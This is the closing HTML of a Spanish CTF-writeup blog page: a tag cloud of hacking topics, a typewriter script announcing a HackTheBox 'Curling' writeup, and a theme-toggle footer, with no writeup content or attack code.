+  <div class="tag-cloud"><a href="/tag/%26/" class="set-1">&</a> <a href="/tag/%2C/" class="set-1">,</a> <a href="/tag/1.8%2C/" class="set-1">1.8,</a> <a href="/tag/4.4%2C/" class="set-1">4.4,</a> <a href="/tag/8.6%2C/" class="set-1">8.6,</a> <a href="/tag/ad/" class="set-1">AD</a> <a href="/tag/adrotate%2C/" class="set-1">ADRotate,</a> <a href="/tag/aspreproast/" class="set-1">ASPREPRoast</a> <a href="/tag/asrep-roast%2C/" class="set-1">ASREP-Roast,</a> <a href="/tag/asreproast/" class="set-1">ASREPRoast</a> <a href="/tag/active/" class="set-1">Active</a> <a href="/tag/admin%2C/" class="set-1">Admin,</a> <a href="/tag/admins/" class="set-1">Admins</a> <a href="/tag/admins%2C/" class="set-1">Admins,</a> <a href="/tag/archivos/" class="set-1">Archivos</a> <a href="/tag/attack%2C/" class="set-1">Attack,</a> <a href="/tag/attacks/" class="set-1">Attacks</a> <a href="/tag/autopwn%2C/" class="set-1">AutoPwn,</a> <a href="/tag/azure/" class="set-1">Azure</a> <a href="/tag/bof%2C/" class="set-1">BOF,</a> <a href="/tag/bin/" class="set-1">Bin</a> <a href="/tag/blind%2C/" class="set-1">Blind,</a> <a href="/tag/bloodhound%2C/" class="set-1">BloodHound,</a> <a href="/tag/bruta%2C/" class="set-1">Bruta,</a> <a href="/tag/bruteforce%2C/" class="set-1">BruteForce,</a> <a href="/tag/bruteforce%2C/" class="set-1">Bruteforce,</a> <a href="/tag/burpsuite%2C/" class="set-1">Burpsuite,</a> <a href="/tag/bypass/" class="set-1">ByPass</a> <a href="/tag/bypass%2C/" class="set-1">Bypass,</a> <a href="/tag/ca/" class="set-1">CA</a> <a href="/tag/cgi-bin%2C/" class="set-1">CGI-BIN,</a> <a href="/tag/cron%2C/" class="set-1">CRON,</a> <a href="/tag/csrf/" class="set-1">CSRF</a> <a href="/tag/curl%2C/" class="set-1">CURL,</a> <a href="/tag/chkrootkit%2C/" class="set-1">Chkrootkit,</a> <a href="/tag/churrasco%2C/" class="set-1">Churrasco,</a> <a href="/tag/cifrado/" class="set-1">Cifrado</a> <a href="/tag/command/" class="set-1">Command</a> <a href="/tag/contracts%2C/" class="set-1">Contracts,</a> <a href="/tag/cracking/" class="set-1">Cracking</a> <a href="/tag/crackmapexec%2C/" class="set-1">Crackmapexec,</a> <a href="/tag/cron-taks%2C/" class="set-1">Cron-taks,</a> <a href="/tag/crontabs%2C/" class="set-1">CronTabs,</a> <a href="/tag/crypto%2C/" class="set-1">Crypto,</a> <a href="/tag/curlftp%2C/" class="set-1">CurlFtp,</a> <a href="/tag/decimal%2C/" class="set-1">Decimal,</a> <a href="/tag/device/" class="set-1">Device</a> <a href="/tag/directory%2C/" class="set-1">Directory,</a> <a href="/tag/dockers%2C/" class="set-1">Dockers,</a> <a href="/tag/domain/" class="set-1">Domain</a> <a href="/tag/dominios%2C/" class="set-1">Dominios,</a> <a href="/tag/dovecot%2C/" class="set-1">Dovecot,</a> <a href="/tag/elastix%2C/" class="set-1">Elastix,</a> <a href="/tag/empezando%2C/" class="set-1">Empezando,</a> <a href="/tag/encrypt-decrypt%2C/" class="set-1">Encrypt-Decrypt,</a> <a href="/tag/enumeracion%2C/" class="set-1">Enumeracion,</a> <a href="/tag/enumeration%2C/" class="set-1">Enumeration,</a> <a href="/tag/ethereum%2C/" class="set-1">Ethereum,</a> <a href="/tag/evil-winrm%2C/" class="set-1">Evil-WinRm,</a> <a href="/tag/excel%2C/" class="set-1">Excel,</a> <a href="/tag/excell/" class="set-1">Excell</a> <a href="/tag/execel/" class="set-1">Execel</a> <a href="/tag/exploit%2C/" class="set-1">Exploit,</a> <a href="/tag/fail2ban%2C/" class="set-1">Fail2ban,</a> <a href="/tag/file/" class="set-1">File</a> <a href="/tag/file%2C/" class="set-1">File,</a> <a href="/tag/files%2C/" class="set-1">Files,</a> <a href="/tag/firefox%2C/" class="set-1">Firefox,</a> <a href="/tag/ftp%2C/" class="set-1">Ftp,</a> <a href="/tag/fueza/" class="set-1">Fueza</a> <a href="/tag/fuzzing/" class="set-1">Fuzzing</a> <a href="/tag/fuzzing%2C/" class="set-1">Fuzzing,</a> <a href="/tag/get-adobject%2C/" class="set-1">Get-ADObject,</a> <a href="/tag/getchanges-all%2C/" class="set-1">GetChanges-All,</a> <a href="/tag/gitlab%2C/" class="set-1">GitLab,</a> <a href="/tag/gitbucket%2C/" class="set-1">Gitbucket,</a> <a href="/tag/gratuitas./" class="set-1">Gratuitas.</a> <a href="/tag/group%2C/" class="set-1">Group,</a> <a href="/tag/groups%2C/" class="set-1">Groups,</a> <a href="/tag/guessing%2C/" class="set-1">Guessing,</a> <a href="/tag/gwolle%2C/" class="set-1">Gwolle,</a> <a href="/tag/htb%2C/" class="set-5">HTB,</a> <a href="/tag/hackthebox%2C/" class="set-1">HackTheBox,</a> <a href="/tag/hacking/" class="set-3">Hacking</a> <a href="/tag/hacking%2C/" class="set-2">Hacking,</a> <a href="/tag/heartbleed%2C/" class="set-1">HeartBleed,</a> <a href="/tag/hex%2C/" class="set-1">Hex,</a> <a href="/tag/hijacking%2C/" class="set-1">Hijacking,</a> <a href="/tag/hydra%2C/" class="set-1">Hydra,</a> <a href="/tag/iis%2C/" class="set-1">IIS,</a> <a href="/tag/iis-6.0%2C/" class="set-1">IIS-6.0,</a> <a href="/tag/ipfs%2C/" class="set-1">IPFS,</a> <a href="/tag/ipv6%2C/" class="set-1">IPV6,</a> <a href="/tag/irc%2C/" class="set-1">IRC,</a> <a href="/tag/id-rsa%2C/" class="set-1">Id-Rsa,</a> <a href="/tag/impackect-secretsdump%2C/" class="set-1">Impackect-SecretsDump,</a> <a href="/tag/import/" class="set-1">Import</a> <a href="/tag/inclusion%2C/" class="set-1">Inclusion,</a> <a href="/tag/injection%29%2C/" class="set-1">Injection),</a> <a href="/tag/injection%2C/" class="set-1">Injection,</a> <a href="/tag/jjs%2C/" class="set-1">JJS,</a> <a href="/tag/jndi%2C/" class="set-1">JNDI,</a> <a href="/tag/joomla%2C/" class="set-1">Joomla,</a> <a href="/tag/journalctl%2C/" class="set-1">Journalctl,</a> <a href="/tag/juicypotato%2C/" class="set-1">JuicyPotato,</a> <a href="/tag/kerberoasting/" class="set-1">Kerberoasting</a> <a href="/tag/kerbrute/" class="set-1">Kerbrute</a> <a href="/tag/kerbrute%2C/" class="set-1">Kerbrute,</a> <a href="/tag/kernel/" class="set-1">Kernel</a> <a href="/tag/knocking%2C/" class="set-1">Knocking,</a> <a href="/tag/kubernetes%2C/" class="set-1">Kubernetes,</a> <a href="/tag/ldap/" class="set-1">LDAP</a> <a href="/tag/ldap%2C/" class="set-1">LDAP,</a> <a href="/tag/lfi%2C/" class="set-1">LFI,</a> <a href="/tag/local/" class="set-1">Local</a> <a href="/tag/log4j%2C/" class="set-1">Log4j,</a> <a href="/tag/mail%2C/" class="set-1">Mail,</a> <a href="/tag/malicius/" class="set-1">Malicius</a> <a href="/tag/maquina/" class="set-1">Maquina</a> <a href="/tag/maquinas/" class="set-5">Maquinas</a> <a href="/tag/mattermost%2C/" class="set-1">Mattermost,</a> <a href="/tag/mimikatz.exe%2C/" class="set-1">Mimikatz.exe,</a> <a href="/tag/misconfigurations%2C/" class="set-1">Misconfigurations,</a> <a href="/tag/mongo-db%2C/" class="set-1">Mongo-db,</a> <a href="/tag/mongodb%2C/" class="set-1">MongoDB,</a> <a href="/tag/mr.robot%2C/" class="set-1">Mr.Robot,</a> <a href="/tag/mssqlclient%2C/" class="set-1">Mssqlclient,</a> <a href="/tag/multiples/" class="set-1">Multiples</a> <a href="/tag/myssql-server%2C/" class="set-1">Myssql-Server,</a> <a href="/tag/neo4j%2C/" class="set-1">Neo4j,</a> <a href="/tag/nibbleblog%2C/" class="set-1">NibbleBlog,</a> <a href="/tag/nishang%2C/" class="set-1">Nishang,</a> <a href="/tag/nosqli%2C/" class="set-1">NoSQLI,</a> <a href="/tag/node-red%2C/" class="set-1">Node-Red,</a> <a href="/tag/nostromo/" class="set-1">Nostromo</a> <a href="/tag/os/" class="set-1">OS</a> <a href="/tag/oscp/" class="set-3">OSCP</a> <a href="/tag/osticket%2C/" class="set-1">OSTicket,</a> <a href="/tag/offensive/" class="set-1">Offensive</a> <a href="/tag/olevba/" class="set-1">Olevba</a> <a href="/tag/php%2C/" class="set-1">PHP,</a> <a href="/tag/php./" class="set-1">PHP.</a> <a href="/tag/password/" class="set-1">Password</a> <a href="/tag/path/" class="set-1">Path</a> <a href="/tag/path%2C/" class="set-3">Path,</a> <a href="/tag/pivoting%2C/" class="set-1">Pivoting,</a> <a href="/tag/plugins%2C/" class="set-1">Plugins,</a> <a href="/tag/pods%2Fcontainer./" class="set-1">Pods/Container.</a> <a href="/tag/popd%2C/" class="set-1">PopD,</a> <a href="/tag/port/" class="set-1">Port</a> <a href="/tag/portknocking%2C/" class="set-1">PortKnocking,</a> <a href="/tag/portainer%2C/" class="set-1">Portainer,</a> <a href="/tag/portal%2C/" class="set-1">Portal,</a> <a href="/tag/post-explotacion./" class="set-1">Post-Explotacion.</a> <a href="/tag/powershell/" class="set-1">PowerShell</a> <a href="/tag/powerup%2C/" class="set-1">PowerUp,</a> <a href="/tag/powershell%2C/" class="set-1">Powershell,</a> <a href="/tag/privesc/" class="set-1">Privesc</a> <a href="/tag/privesc%2C/" class="set-1">Privesc,</a> <a href="/tag/proteccions%2C/" class="set-1">Proteccions,</a> <a href="/tag/protection%2C/" class="set-1">Protection,</a> <a href="/tag/python%2C/" class="set-1">Python,</a> <a href="/tag/python3%2C/" class="set-1">Python3,</a> <a href="/tag/rce%2C/" class="set-1">RCE,</a> <a href="/tag/rdp-file%2C/" class="set-1">RDP-file,</a> <a href="/tag/rpcclient%2C/" class="set-1">RPCCLIENT,</a> <a href="/tag/read%2C/" class="set-1">Read,</a> <a href="/tag/readgmsapassword%2C/" class="set-1">ReadGMSAPassword,</a> <a href="/tag/recycle/" class="set-1">Recycle</a> <a href="/tag/remote/" class="set-1">Remote</a> <a href="/tag/retiradas/" class="set-1">Retiradas</a> <a href="/tag/retiradas%2C/" class="set-5">Retiradas,</a> <a href="/tag/retiradas./" class="set-1">Retiradas.</a> <a href="/tag/revome/" class="set-1">Revome</a> <a href="/tag/smb%2C/" class="set-1">SMB,</a> <a href="/tag/snmp%2C/" class="set-1">SNMP,</a> <a href="/tag/sqli/" class="set-1">SQLI</a> <a href="/tag/sqli%2C/" class="set-1">SQLI,</a> <a href="/tag/sqlinjecction%2C/" class="set-1">SQLInjecction,</a> <a href="/tag/ss%2C/" class="set-1">SS,</a> <a href="/tag/ssh%2C/" class="set-1">SSH,</a> <a href="/tag/ssrf/" class="set-1">SSRF</a> <a href="/tag/ssrf%2C/" class="set-1">SSRF,</a> <a href="/tag/ssti%28server/" class="set-1">SSTI(Server</a> <a href="/tag/suid%2C/" class="set-1">SUID,</a> <a href="/tag/sam%2C/" class="set-1">Sam,</a> <a href="/tag/samba%2C/" class="set-1">Samba,</a> <a href="/tag/scheduler%2C/" class="set-1">Scheduler,</a> <a href="/tag/script%2C/" class="set-1">Script,</a> <a href="/tag/secretsdump.py%2C/" class="set-1">SecretsDump.py,</a> <a href="/tag/secretsdumps.py%2C/" class="set-1">Secretsdumps.py,</a> <a href="/tag/security%2C/" class="set-1">Security,</a> <a href="/tag/shares/" class="set-1">Shares</a> <a href="/tag/sharphound.ps1%2C/" class="set-1">SharpHound.ps1,</a> <a href="/tag/shellshock%2C/" class="set-1">ShellShock,</a> <a href="/tag/side/" class="set-1">Side</a> <a href="/tag/smart/" class="set-1">Smart</a> <a href="/tag/smb%2C/" class="set-1">Smb,</a> <a href="/tag/smbclient%2C/" class="set-1">SmbClient,</a> <a href="/tag/smbmap%2C/" class="set-1">SmbMap,</a> <a href="/tag/sqsh%2C/" class="set-1">Sqsh,</a> <a href="/tag/starting/" class="set-1">Starting</a> <a href="/tag/steganografia%2C/" class="set-1">Steganografia,</a> <a href="/tag/subdomains%2C/" class="set-1">Subdomains,</a> <a href="/tag/sudo/" class="set-1">Sudo</a> <a href="/tag/system%2C/" class="set-1">System,</a> <a href="/tag/thm%2C/" class="set-1">THM,</a> <a href="/tag/template/" class="set-1">Template</a> <a href="/tag/tmux-priv%2C/" class="set-1">Tmux-Priv,</a> <a href="/tag/tomcat/" class="set-1">Tomcat</a> <a href="/tag/tomcat%2C/" class="set-1">Tomcat,</a> <a href="/tag/transfer%2C/" class="set-1">Transfer,</a> <a href="/tag/transferencia/" class="set-1">Transferencia</a> <a href="/tag/tryhackme%2C/" class="set-1">TryHackMe,</a> <a href="/tag/ubuntu/" class="set-1">Ubuntu</a> <a href="/tag/unrealirc%2C/" class="set-1">UnRealIRC,</a> <a href="/tag/upload/" class="set-1">Upload</a> <a href="/tag/userenum%2C/" class="set-1">Userenum,</a> <a href="/tag/vnc/" class="set-1">VNC</a> <a href="/tag/web/" class="set-2">Web</a> <a href="/tag/web3%2C/" class="set-1">Web3,</a> <a href="/tag/webshell%2C/" class="set-1">Webshell,</a> <a href="/tag/wget/" class="set-1">Wget</a> <a href="/tag/winpeas%2C/" class="set-1">WinPeas,</a> <a href="/tag/windows/" class="set-1">Windows</a> <a href="/tag/windows%2C/" class="set-1">Windows,</a> <a href="/tag/wordpress%2C/" class="set-1">Wordpress,</a> <a href="/tag/wpscan%2C/" class="set-1">Wpscan,</a> <a href="/tag/writeup/" class="set-2">Writeup</a> <a href="/tag/writeup%2C/" class="set-3">Writeup,</a> <a href="/tag/x-forwarder-for%2C/" class="set-1">X-Forwarder-For,</a> <a href="/tag/xp_cmdshell%2C/" class="set-1">Xp_CmdShell,</a> <a href="/tag/xp_dirtree%2C/" class="set-1">Xp_dirtree,</a> <a href="/tag/ysoserial%2C/" class="set-1">Ysoserial,</a> <a href="/tag/zona%2C/" class="set-1">Zona,</a> <a href="/tag/zone/" class="set-1">Zone</a> <a href="/tag/app-js%2C/" class="set-1">app-js,</a> <a href="/tag/bashscript%2C/" class="set-1">bashscript,</a> <a href="/tag/chisel%2C/" class="set-1">chisel,</a> <a href="/tag/de/" class="set-1">de</a> <a href="/tag/dompdf%2C/" class="set-1">dompdf,</a> <a href="/tag/ecppt%2C/" class="set-1">eCPPT,</a> <a href="/tag/fcrackzip%2C/" class="set-1">fcrackzip,</a> <a href="/tag/html/" class="set-1">html</a> <a href="/tag/injecction/" class="set-1">injecction</a> <a href="/tag/msfvenom%2C/" class="set-1">msfvenom,</a> <a href="/tag/nmap%2C/" class="set-1">nmap,</a> <a href="/tag/pfsense%2C/" class="set-1">pfSense,</a> <a href="/tag/pfx2john%2C/" class="set-1">pfx2john,</a> <a href="/tag/phpliteadmin%2C/" class="set-1">phpLiteAdmin,</a> <a href="/tag/privesc/" class="set-1">privesc</a> <a href="/tag/privesc%2C/" class="set-1">privesc,</a> <a href="/tag/python%2C/" class="set-1">python,</a> <a href="/tag/redis-cli%2C/" class="set-1">redis-cli,</a> <a href="/tag/rsync%2C/" class="set-1">rsync,</a> <a href="/tag/smtpd%2C/" class="set-1">smtpd,</a> <a href="/tag/socat%2C/" class="set-1">socat,</a> <a href="/tag/squidproxy%2C/" class="set-1">squidproxy,</a> <a href="/tag/steghide%2C/" class="set-1">steghide,</a> <a href="/tag/tar%2C/" class="set-1">tar,</a> <a href="/tag/webdav%2C/" class="set-1">webdav,</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/xss/" class="set-1">xss</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada CURLING';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
